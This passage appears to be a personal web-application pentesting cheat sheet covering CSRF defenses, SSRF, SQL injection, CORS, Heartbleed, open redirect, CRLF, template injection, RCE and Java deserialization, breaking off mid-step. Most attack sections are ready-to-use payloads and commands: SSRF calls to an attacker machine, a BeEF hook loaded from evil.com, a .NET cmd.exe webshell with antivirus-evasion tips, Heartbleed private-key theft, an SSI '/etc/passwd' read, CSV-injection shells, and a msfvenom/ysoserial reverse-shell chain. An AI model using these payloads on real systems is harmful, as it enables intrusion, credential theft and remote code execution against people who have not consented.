+<a href="https://security.stackexchange.com/questions/149085/vuln-cross-origin-resource-sharing-arbitrary-origin-trusted">https://security.stackexchange.com/questions/149085/vuln-cross-origin-resource-sharing-arbitrary-origin-trusted</a><br>
+<a href="https://www.moesif.com/blog/technical/cors/Authoritative-Guide-to-CORS-Cross-Origin-Resource-Sharing-for-REST-APIs/">https://www.moesif.com/blog/technical/cors/Authoritative-Guide-to-CORS-Cross-Origin-Resource-Sharing-for-REST-APIs/</a></p>
+<h2 id="remediationandprevention">Remediation and Prevention</h2>
+<p>Ideally, this is something that should not be done from scratch. It's best to use a framework that does this work for you.</p>
+<p>However, if you are dealing with a developer that is planning to roll their own, then:</p>
+<ul>
+<li>
+<p>Add a random token to each user session. The token should be sent with a POST request (GET requests have the means to leak the token in log files, browser history, etc.)</p>
+</li>
+<li>
+<p>Generating a token per request can lead to usability problems, such as the back button not working properly.</p>
+</li>
+<li>
+<p>Be sure that the token is only sent over TLS to avoid MITM issues.</p>
+</li>
+</ul>
+<h3 id="doublesubmitcookie">Double Submit Cookie</h3>
+<p>This can be used for situations in which maintaining the state for a CSRF token on the server side is difficult. It's easy to implement and is stateless.</p>
+<ul>
+<li>A random value is sent in both a cookie and as a request parameter</li>
+<li>The server verifies the cookie value and request value match</li>
+<li>When a user visits, the site should generate a cryptographically strong psuedorandom value and set it as a cookie on the user's machine separate from the session ID.</li>
+<li>The site requires every request includes this value as a hidden form value, request header, or request parameter.</li>
+<li>If they both match server side, the server accepts the request</li>
+</ul>
+<p>It's not bulletproof unless your subdomains are fully secured and only accept HTTPS connections.</p>
+<p>Including the value in an encrypted cookie alongside the authentication cookie and then matching the decrypted authentication cookie server side with the token in a hidden form field, request header, or request parameter is a solid choice. This is because a subdomain has no way to overwrite a properly crafted encryption cookie without the encryption key.</p>
+<p><strong>Resources:</strong><br>
+<a href="https://security.stackexchange.com/questions/162/what-is-the-correct-way-to-implement-anti-csrf-form-tokens">https://security.stackexchange.com/questions/162/what-is-the-correct-way-to-implement-anti-csrf-form-tokens</a><br>
+<a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md">https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md</a><br>
+<a href="https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/">https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="ssrf">SSRF</h1>
+<p>If you have control over a URL parameter and it's not a redirect, you should start hunting for SSRF.</p>
+<p>It's also worthwhile to look at Webhooks, PDF generators, document parsers, and file uploads. More information can be found <a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">here</a>.</p>
+<p>Some things to test:</p>
+<p>See if there's a way to port scan internal assets: <code>http://internal-server:22/notarealfile.txt</code></p>
+<p>If you get an error message back, review the output to see if there is a difference and possible indicators between two ports to determine when you've found open vs closed. If there is no error message, determine if you can detect an open or closed port via the amount of time it takes for a requesat to time out.</p>
+<p>Alternatively, out-of-band detection mechanisms are great as well. Use Burp Collaborator or set up a listener: <code>nc -l -n -vv -p 8080 -k</code>.</p>
+<p>In my experience, some of the vulnerable components have only worked with certain ports, such as 80, 8080, 443, etc. It's good to test against these ports to make sure you aren't missing something.</p>
+<p>If you have an endpoint that appends a path to your payload, try adding a <code>&amp;</code> or a <code>#</code> to the end of your payload like so:</p>
+<p><code>http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&amp;</code><br>
+<code>http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#</code></p>
+<p>If there's a parser looking for a specific IP address, try <a href="http://www.ipaddressguide.com/ip">decimal IP notation</a>.</p>
+<p>How to bypass SSRF protections:<br>
+<a href="https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b">https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b</a></p>
+<p>This has a great write-up on SOP and CORS, as well as SSRF: <a href="https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/">https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/</a></p>
+<p>Bug Bounty Write-ups:<br>
+<a href="https://hackerone.com/reports/115748">https://hackerone.com/reports/115748</a><br>
+<a href="https://hackerone.com/reports/301924">https://hackerone.com/reports/301924</a><br>
+<a href="https://www.sxcurity.pro/hackertarget/">https://www.sxcurity.pro/hackertarget/</a><br>
+<a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html">http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</a><br>
+<a href="https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf">https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf</a><br>
+<a href="https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf">https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf</a><br>
+<a href="https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/">https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/</a></p>
+<p>Payloads:<br>
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF injection</a></p>
+<h3 id="resources">Resources</h3>
+<p><a href="http://resources.infosecinstitute.com/the-ssrf-vulnerability/#gref">http://resources.infosecinstitute.com/the-ssrf-vulnerability/#gref</a><br>
+<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a><br>
+<a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a><br>
+<a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/">https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/</a><br>
+<a href="https://securingtomorrow.mcafee.com/mcafee-labs/server-side-request-forgery-takes-advantage-vulnerable-app-servers/">https://securingtomorrow.mcafee.com/mcafee-labs/server-side-request-forgery-takes-advantage-vulnerable-app-servers/</a><br>
+<a href="https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/">https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/</a></p>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Disable unused URL schemas such as <code>file</code>, <code>dict</code>, <code>ftp</code>, and <code>gopher</code></li>
+<li>Whitelist the DNS name or IP address your application needs to access</li>
+<li>Validate user input</li>
+</ul>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><h1 id="recon">Recon</h1>
+<p><a href="https://medium.com/@adrien_jeanneau/whats-tools-i-use-for-my-recon-during-bugbounty-ec25f7f12e6d">https://medium.com/@adrien_jeanneau/whats-tools-i-use-for-my-recon-during-bugbounty-ec25f7f12e6d</a></p>
+<h1 id="sqlinjection">SQL Injection</h1>
+<h2 id="usingsqlmaptotestasitewithjwtandbasicauth">Using sqlmap to test a site with JWT and basic auth:</h2>
+<pre><code>sqlmap -u https://target --headers="X-Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU1NDkzNjEwNSwiZXhwIjoxNTU0OTM2MjI1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.CUJeDfpJCBD-RKCkGe6q5U2byv0rkxZnRhvPwyFYglg" --data={"note":"asdf","id":"1*"} --level=5 --risk=2 --dbs --auth-type=basic --auth-cred=user:password -vvvv
+</code></pre>
+<p><code>--data</code>: used to specify post data<br>
+<code>*</code>: used to tell sqlmap where to try injecting, if you haven't specified a parameter with <code>-p</code></p>
+<p><strong>Resources:</strong><br>
+<a href="https://github.com/sqlmapproject/sqlmap/issues/646">https://github.com/sqlmapproject/sqlmap/issues/646</a></p>
+<h2 id="testforsqliinputrestparamswithsqlmap">Test for SQLi in PUT REST Params with SQLMap:</h2>
+<ol>
+<li>Mark the Vulnerable parameter with <code>*</code></li>
+<li>Copy the request and paste it into a file.</li>
+<li>Run it with sqlmap:<br>
+<code>sqlmap -r &lt;file with request&gt; -vvvv</code></li>
+</ol>
+<p>Use <a href="https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win">tamper scripts</a> to tell sqlmap how to encode its injections.</p>
+<p><a href="https://github.com/ron190/jsql-injection.git">JSQL</a> is an alternative to sqlmap that is not nearly as developed, but looks interesting.</p>
+<p>Developers seemed to respond well to <a href="http://www.lavamunky.com/2011/11/why-parameterized-queries-stop-sql.html">this</a> when they were unable to understand why parameterized queries worked. TL;DR - the values are separated from the query itself.</p>
+<p>Cheatsheet: <a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
+<p><strong>Resource:</strong> <a href="https://www.sxcurity.pro/asus-sqli/">https://www.sxcurity.pro/asus-sqli/</a></p>
+<p>Try double encoding input, i.e. try this: <code>https://site.com/q/getjson.php?s=%2527</code></p>
+<p><strong>Resource:</strong> <a href="https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/">https://buer.haus/2015/01/15/yahoo-root-access-sql-injection-tw-yahoo-com/</a></p>
+<h1 id="sessionfixation">Session Fixation</h1>
+<p>A quick sanity check that can be used to determine if Session Fixation is an issue on a site:</p>
+<ol>
+<li>
+<p>Go to the login page, observe the session ID that the unauthenticated user has.</p>
+</li>
+<li>
+<p>Login to the site. Once in, observe the session ID that the user has. If the session ID matches the one that was given by the site before the user authenticated, you are looking at a session fixation vulnerability.</p>
+</li>
+</ol>
+<h1 id="fileuploadvulnerabilities">File upload vulnerabilities</h1>
+<p>Create test 10gig file on OS X (useful for testing file upload limitations):<br>
+<code>mkfile -n 10g temp_10GB_file</code></p>
+<h2 id="unrestrictedfileupload">Unrestricted File Upload</h2>
+<h4 id="resources">Resources</h4>
+<p><a href="http://nileshkumar83.blogspot.com/2017/01/file-upload-through-null-byte-injection.html">http://nileshkumar83.blogspot.com/2017/01/file-upload-through-null-byte-injection.html</a></p>
+<h1 id="othercheatsheets">Other Cheatsheets</h1>
+<p><a href="https://github.com/jhaddix/tbhm">https://github.com/jhaddix/tbhm</a></p>
+<h1 id="corsmisconfiguration">CORS Misconfiguration</h1>
+<p>Basic POC for testing (loosely based off of <a href="https://www.sxcurity.pro/tricky-CORS/">https://www.sxcurity.pro/tricky-CORS/</a> and <a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/">https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/</a>):</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;center&gt;
+      &lt;h2&gt;CORS POC Exploit&lt;/h2&gt;
+
+      &lt;div id="demo"&gt;
+        &lt;button type="button" onclick="cors()"&gt;Exploit&lt;/button&gt;
+      &lt;/div&gt;
+
+      &lt;script&gt;
+function cors() {
+  var req = new XMLHttpRequest();
+  req.onreadystatechange = function() {
+    if (this.readyState == 4 &amp;&amp; this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+      // If you want to print something out after it finishes:
+      //alert(req.getAllResponseHeaders());
+      //alert(localStorage.access_token);
+    }
+  };
+  // If you need to set a header (you probably won't):
+  // req.setRequestHeader("header name", "value");
+  req.open("GET", "&lt;site&gt;", true);
+  req.withCredentials = true;
+  req.send();
+}
+      &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="resources">Resources</h3>
+<p><a href="https://www.securityninja.io/understanding-cross-origin-resource-sharing-cors/">https://www.securityninja.io/understanding-cross-origin-resource-sharing-cors/</a><br>
+<a href="http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html">http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html</a><br>
+<a href="https://www.youtube.com/watch?v=wgkj4ZgxI4c">https://www.youtube.com/watch?v=wgkj4ZgxI4c</a><br>
+<a href="http://ejj.io/misconfigured-cors/">http://ejj.io/misconfigured-cors/</a><br>
+<a href="https://www.youtube.com/watch?v=lg31RYYG-T4">https://www.youtube.com/watch?v=lg31RYYG-T4</a><br>
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a><br>
+<a href="https://w3c.github.io/webappsec-cors-for-developers/#cors">https://w3c.github.io/webappsec-cors-for-developers/#cors</a><br>
+<a href="http://gerionsecurity.com/2013/11/cors-attack-scenarios/">http://gerionsecurity.com/2013/11/cors-attack-scenarios/</a><br>
+Using CORS misconfiguration to steal a CSRF Token:<br>
+<a href="https://yassineaboukir.com/blog/security-impact-of-a-misconfigured-cors-implementation/">https://yassineaboukir.com/blog/security-impact-of-a-misconfigured-cors-implementation/</a></p>
+<h1 id="testingforheartbleed">Testing for heartbleed</h1>
+<pre><code>nmap -d --script ssl-heartbleed --script-args vulns.showall -sV -p &lt;port&gt; &lt;target ip&gt; --script-trace -oA heartbleed-%y%m%d
+</code></pre>
+<h2 id="stealprivatekey">Steal private key:</h2>
+<pre><code>wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
+echo "&lt;target&gt;:&lt;port&gt;" &gt; targets.txt
+python heartbleed.py -f targets.txt -v -e
+</code></pre>
+<h2 id="readthroughthememory">Read through the memory:</h2>
+<pre><code>wget https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py
+python heartbleed-poc.py &lt;target&gt; -p &lt;target port&gt; | less
+</code></pre>
+<p>You can also run <code>strings</code> on the subsequent dump.bin file that is created if you prefer.</p>
+<h4 id="resources">Resources</h4>
+<p><a href="https://gist.github.com/bonsaiviking/10402038">https://gist.github.com/bonsaiviking/10402038</a><br>
+<a href="https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py">https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py</a></p>
+<h1 id="getburpsuiteworkingwithchromeonosx">Get Burp Suite working with Chrome on OSX</h1>
+<ol>
+<li>Download the Burp certificate by going to <code>http://burp</code> and clicking <strong>CA Certificate</strong></li>
+<li>Go to Keychain Access</li>
+<li>Click <strong>File</strong> -&gt; <strong>Import Items</strong></li>
+<li>Click the "I" icon in the lower left hand side of the window</li>
+<li>Click the arrow next to <strong>Trust</strong></li>
+<li>Change <strong>When using this certificate:</strong> to <strong>Always Trust</strong></li>
+<li>Restart Chrome</li>
+</ol>
+<h1 id="whatisthedom">What is the DOM?</h1>
+<p>This probably belongs at the top of this article, but I found this article recently thanks to <a href="https://www.gracefulsecurity.com/an-introduction-to-dom-xss/">this page</a>, and found the explanation to be simple, concise, and to the point: <a href="https://css-tricks.com/dom/">https://css-tricks.com/dom/</a>. Definitely something I wish I had found when I was getting started in this field.</p>
+<h1 id="openredirect">Open Redirect</h1>
+<p>Open redirect to XSS: <a href="http://breenmachine.blogspot.com/2013/01/abusing-open-redirects-to-bypass-xss.html">http://breenmachine.blogspot.com/2013/01/abusing-open-redirects-to-bypass-xss.html</a></p>
+<p>Payloads:<br>
+<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a></p>
+<h2 id="openredirecttoxssbeefpayload">Open redirect to XSS BEeF payload:</h2>
+<pre><code>&lt;script&gt; s=document.createElement('script'); s.type='text/javascript'; s.src='http://evil.com:3000/hook.js'; document.getElementsByTagName('head')[0].appendChild(s); &lt;/script&gt;
+</code></pre>
+<p>Use the Decoder in Burp to encode this to base-64, and deliver it for the payload:</p>
+<pre><code>data:text/html;base64,PHNjcmlwdD4gcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgcy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnOyBzLnNyYz0naHR0cDovL2V2aWwuY29tOjMwMDAvaG9vay5qcyc7IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQocyk7IDwvc2NyaXB0Pg==
+</code></pre>
+<p>Other payloads to try:<br>
+<code>http://;URL=javascript:alert('XSS')</code><br>
+<code>data:text/html%3bbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code><br>
+<code>javascript://%0aalert(1)</code><br>
+<code>javascript://%0dalert(1)</code><br>
+<code>ja\nva\tscript\r:alert(1)//?</code><br>
+<code>\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)//?</code></p>
+<p>This site has a ton of payload ideas: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20redirect">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open redirect</a></p>
+<p><strong>Resources:</strong><br>
+<a href="http://blog.beefproject.com/2013/03/subverting-cloud-based-infrastructure.html">http://blog.beefproject.com/2013/03/subverting-cloud-based-infrastructure.html</a></p>
+<h1 id="crlfinjection">CRLF Injection</h1>
+<p>If you see your input parameter for a request:</p>
+<pre><code>http://inj.example.org/redirect.asp?origin=foo
+</code></pre>
+<p>echo'd back in the response headers:</p>
+<pre><code>HTTP/1.1 302 Object moved
+Date: Mon, 07 Mar 2016 17:42:46 GMT
+Location: account.asp?origin=foo
+Connection: close
+Content-Length: 121
+
+&lt;head&gt;&lt;title&gt;Object moved&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This object may be found &lt;a HREF=""&gt;here&lt;/a&gt;.&lt;/body&gt;
+</code></pre>
+<p>You should try CRLF injection:</p>
+<pre><code>http://inj.example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a
+</code></pre>
+<p>CRLF: <code>%0d%0a</code></p>
+<h3 id="resources">Resources</h3>
+<p><a href="https://medium.com/@tomnomnom/crlf-injection-into-phps-curl-options-e2e0d7cfe545">https://medium.com/@tomnomnom/crlf-injection-into-phps-curl-options-e2e0d7cfe545</a><br>
+<a href="https://www.gracefulsecurity.com/http-header-injection/">https://www.gracefulsecurity.com/http-header-injection/</a><br>
+<a href="https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)">https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)</a><br>
+<a href="https://www.acunetix.com/websitesecurity/crlf-injection/">https://www.acunetix.com/websitesecurity/crlf-injection/</a><br>
+<a href="https://blog.innerht.ml/twitter-crlf-injection/">https://blog.innerht.ml/twitter-crlf-injection/</a></p>
+<h1 id="templateinjection">Template Injection</h1>
+<h2 id="angular">Angular</h2>
+<p>Some code you can throw into jsfiddle for payload testing:</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt; 
+&lt;meta charset="utf-8"&gt;
+&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div ng-app&gt;
+{{constructor.constructor('alert(1)')()}}
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="resources">Resources</h3>
+<p><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html">http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</a></p>
+<h1 id="rce">RCE</h1>
+<h2 id="bypassavwithwebshelluploadsnet">Bypass AV with webshell uploads (.NET):</h2>
+<p>Take a known webshell, and modify strings such as function names and the title (if applicable).</p>
+<p>Here's an example with one of the webshells found in the fuzzdb project:</p>
+<pre><code>&lt;%@ Page Language="C#" Debug="true" Trace="false" %&gt;
+&lt;%@ Import Namespace="System.Diagnostics" %&gt;
+&lt;%@ Import Namespace="System.IO" %&gt;
+&lt;script Language="c#" runat="server"&gt;
+void Page_Load(object sender, EventArgs e)
+{
+}
+string executeIt(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdClick(object sender, System.EventArgs e)
+{
+Response.Write("&lt;pre&gt;");
+Response.Write(Server.HtmlEncode(executeIt(txtArg.Text)));
+Response.Write("&lt;/pre&gt;");
+}
+&lt;/script&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;title&gt;REALLY NICE&lt;/title&gt;
+&lt;/HEAD&gt;
+&lt;body &gt;
+&lt;form id="cmd" method="post" runat="server"&gt;
+&lt;asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;
+&lt;asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="execute" OnClick="cmdClick"&gt;&lt;/asp:Button&gt;
+&lt;asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server"&gt;Command:&lt;/asp:Label&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/HTML&gt;
+</code></pre>
+<h3 id="references">References</h3>
+<p><a href="https://hax365.wordpress.com/2015/12/15/easy-trick-to-upload-a-web-shell-and-bypass-av-products/">https://hax365.wordpress.com/2015/12/15/easy-trick-to-upload-a-web-shell-and-bypass-av-products/</a></p>
+<h2 id="anonymousfunctionrceinphp">Anonymous function RCE in php</h2>
+<p><code>$inputFunc = function() use($a, $b, $c, &amp;$f){echo(exec('whoami'));};</code></p>
+<h1 id="phpexperimentation">PHP Experimentation</h1>
+<p>If you need to test some php code, you can use the native web server to host it up:<br>
+<code>php -S 127.0.0.1:80 -t .</code></p>
+<p>Obviously you should be careful with this...</p>
+<h2 id="phpinteractiveshell">PHP interactive shell</h2>
+<p><code>php -a</code></p>
+<h1 id="csvinjection">CSV Injection</h1>
+<p>Open a webpage: <code>=HYPERLINK("http://evil.com:666","hell")</code></p>
+<p><strong>Resource:</strong> <a href="https://www.we45.com/blog/2017/02/14/csv-injection-theres-devil-in-the-detail">https://www.we45.com/blog/2017/02/14/csv-injection-theres-devil-in-the-detail</a></p>
+<p>In excel on Windows, input the following to get a cmd shell:<br>
+<code>=cmd|'cmd'!''</code></p>
+<p>Great real world example:<br>
+<a href="https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/">https://rhinosecuritylabs.com/azure/cloud-security-risks-part-1-azure-csv-injection-vulnerability/</a></p>
+<p>Great write-up here explaining what it is and why you want to be concerned: <a href="http://georgemauer.net/2017/10/07/csv-injection.html">http://georgemauer.net/2017/10/07/csv-injection.html</a></p>
+<p>A video showing an example of this as well:<br>
+<a href="https://www.youtube.com/watch?v=SC7AkclnG2g">https://www.youtube.com/watch?v=SC7AkclnG2g</a></p>
+<h1 id="contentdiscovery">Content Discovery</h1>
+<p>Burp intruder ftw. Custom content discovery paylaods:<br>
+<a href="https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10">https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10</a></p>
+<h1 id="usefulscripts">Useful scripts</h1>
+<h2 id="continouslycheckifasiteisupordown">Continously check if a site is up or down</h2>
+<pre><code>while true; do /usr/bin/wget "http://[target]/uri/path" --timeout 30 -O - 2&gt;/dev/null | grep "[item on page]" || echo "The site is down"; sleep 10; done
+</code></pre>
+<h1 id="idors">IDORs</h1>
+<p><a href="https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/">https://www.bugcrowd.com/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/</a></p>
+<h1 id="serversideincludesssiinjection">Server-Side Includes (SSI) Injection</h1>
+<p>Put this in for a vulnerable parameter: <code>&lt;!--#echo var="DATE_LOCAL" --&gt;</code></p>
+<p>You should see the current date and time output in the response if this worked.</p>
+<p>If the previous payload worked, try something like this: <code>&lt;!--#printenv --&gt;</code></p>
+<p>This will output environment variables on the system.</p>
+<p>Go for the gold: <code>&lt;!--#exec cmd="cat /etc/passwd"--&gt;</code></p>
+<p>I think it's pretty obvious what's happening in this one.</p>
+<p>There is a great list of payloads that you can play around with <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/SSI-Injection-JHADDIX.txt">here</a>.</p>
+<p>It is also worth testing the vulnerable parameter for XSS as well.</p>
+<!--kg-card-end: markdown--><!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="clickjacking">Clickjacking</h1>
+<p>Just use Burp's clickbandit. Also remember: Clickjacking is for clicks, not for keyboard.</p>
+<h2 id="quickanddirtytestscript">Quick and dirty test script</h2>
+<pre><code>&lt;html&gt;
+   &lt;head&gt;
+     &lt;title&gt;Clickjack test page&lt;/title&gt;
+   &lt;/head&gt;
+   &lt;body&gt;
+     &lt;p&gt;Website is vulnerable to clickjacking!&lt;/p&gt;
+     &lt;iframe src="http://target.com" width="500" height="500"&gt;&lt;/iframe&gt;
+   &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Resources:</strong><br>
+<a href="https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009)">https://www.owasp.org/index.php/Testing_for_Clickjacking_(OTG-CLIENT-009)</a><br>
+<a href="https://javascript.info/clickjacking">https://javascript.info/clickjacking</a><br>
+<a href="https://www.tinfoilsecurity.com/blog/what-is-clickjacking">https://www.tinfoilsecurity.com/blog/what-is-clickjacking</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="attackingjsonwithburp">Attacking JSON with Burp</h1>
+<p>Evidently at this point in time (5/2018), Burp's scanner is not doing as well with testing json parameters for SQLi and RCE. Be sure to set custom injection points by sending a potentially vulnerable request to intruder, marking the parameters, right clicking, and clicking <strong>Actively scan defined insertion points</strong> from the dropdown.</p>
+<p><strong>Resource:</strong><br>
+<a href="https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/the-right-way-to-test-json-parameters-with-burp">https://www.coalfire.com/Solutions/Coalfire-Labs/The-Coalfire-LABS-Blog/may-2018/the-right-way-to-test-json-parameters-with-burp</a></p>
+<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h1 id="deserializationvulnerabilities">Deserialization Vulnerabilities</h1>
+<p><a href="https://www.nc-lp.com/blog/weaponize-oracle-weblogic-server-poc-cve-2018-2628">Writeup on Oracle Weblogic CVE-2018-2628</a><br>
+<a href="https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae">Java Deserialization Scanner Burp Extension</a><br>
+<a href="https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f">Java Serialized Payloads Burp Extension</a></p>
+<h2 id="otherwriteups">Other write-ups</h2>
+<p><a href="https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/">https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/</a><br>
+<a href="https://www.coalfire.com/The-Coalfire-Blog/Sept-2018/Exploiting-Blind-Java-Deserialization">https://www.coalfire.com/The-Coalfire-Blog/Sept-2018/Exploiting-Blind-Java-Deserialization</a></p>
+<h2 id="tools">Tools:</h2>
+<p><a href="https://github.com/summitt/burp-ysoserial/releases">Ysoserial</a></p>
+<h2 id="oracleweblogicjavaobjectrmiconnectbackdeserializationrcejanuary2017cpu">Oracle WebLogic Java Object RMI Connect-Back Deserialization RCE (January 2017 CPU)</h2>
+<h3 id="outofbandtest">Out of band test</h3>
+<ol>
+<li>Start a listener:</li>
+</ol>
+<pre><code>python -m http.server 4000
+</code></pre>
+<ol start="2">
+<li>Specify the command to run on the JRMPListener host:</li>
+</ol>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4040 CommonsCollections5 'curl http://&lt;system with listener&gt;:4000/'
+</code></pre>
+<ol start="3">
+<li>Run the exploit:</li>
+</ol>
+<pre><code>python2 deserialize_exploit.py -t &lt;vulnerable system ip&gt; -p &lt;vulnerable system port&gt; --jip &lt;system with listener&gt; --jport 4040 --ysopath ysoserial.jar --cmd ""
+</code></pre>
+<h3 id="getashell">Get a shell</h3>
+<ol>
+<li>Generate a payload with msfvenom:</li>
+</ol>
+<pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;attacker system&gt; LPORT=4444 -f raw &gt; shell.sh
+</code></pre>
+<ol start="2">
+<li>Start a listener:</li>
+</ol>
+<pre><code>python -m http.server 4000
+</code></pre>
+<ol start="3">
+<li>Specify the command to download the reverse shell on the JRMPListener host:</li>
+</ol>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4040 CommonsCollections5 'curl -o /tmp/shell.sh http://&lt;attacker system&gt;:4000/shell.sh'
+</code></pre>
+<ol start="4">
+<li>Start a netcat listener for the reverse connection:</li>
+</ol>
+<pre><code>nc -lvnp 4444
